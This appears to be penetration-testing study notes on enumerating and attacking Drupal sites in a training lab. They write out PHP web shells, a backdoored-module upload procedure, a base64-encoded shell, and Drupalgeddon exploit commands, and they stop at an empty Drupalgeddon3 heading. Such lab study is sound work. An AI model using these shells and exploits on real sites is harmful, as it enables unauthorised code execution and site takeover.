# Drupal - Discovery & Enumeration
## Discovery/Footprinting
A Drupal website can be identified in several ways, including by the header or footer message Powered by Drupal, the standard Drupal logo, the presence of a CHANGELOG.txt file or README.txt file, via the page source, or clues in the robots.txt file such as references to /node.
```
curl -s http://drupal.inlanefreight.local | grep Drupal
```
Another way to identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`

## Enumeration
```
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```
```
droopescan scan drupal -u http://drupal.inlanefreight.local
```

# Attacking Drupal

## Leveraging the PHP Filter Module
In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated
```
http://drupal-qa.inlanefreight.local/#overlay=admin/modules
```
1. Tick the check box next to the PHP filter module 
2. Scroll down to Save configuration 
3. Go to Content --> Add content and create a Basic page
```
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```
4. set Text format drop-down to PHP code
```
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

From version 8 onwards, the PHP Filter module is not installed by default.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Once downloaded go to Administration > Reports > Available updates
3. From here, click on Browse, select the file from the directory we downloaded it to, and then click Install
4. Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example

## Uploading a Backdoored Module
Drupal allows users with appropriate permissions to upload a new module.
1. Download the archive and extract its contents. 
```
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```
```
tar xvf captcha-8.x-1.2.tar.gz
```
2. Preparing the files to add to the tar file
	1. Create a PHP web shell with the contents `<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]); ?>`
	2. Create a .htaccess file to give ourselves access to the folder `<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>`
3. Copy both of these files to the captcha folder and create an archive:
	1. `mv shell.php .htaccess captcha`
	2. `tar cvf captcha.tar.gz captcha/`
4. Assuming we have administrative access to the website:
	1. Click on `Manage` and then Extend on the sidebar
	2. Next, click on the `+ Install new module` button, and we will be taken to the install page
	3. Browse to the backdoored Captcha archive and click Install.
	4. Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands.
```
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## Leveraging Known Vulnerabilities
### Drupalgeddon
https://www.exploit-db.com/exploits/34992
This flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this PoC script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.
```
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```
Log in as an admin and proceed as above

### Drupalgeddon2
https://www.exploit-db.com/exploits/44448
```
python3 drupalgeddon2.py
```
1. We can check quickly with cURL and see that the hello.txt file was indeed uploaded.
2. replace the echo command in the exploit script with a command to write out our malicious PHP script
```
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
```
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

### Drupalgeddon3
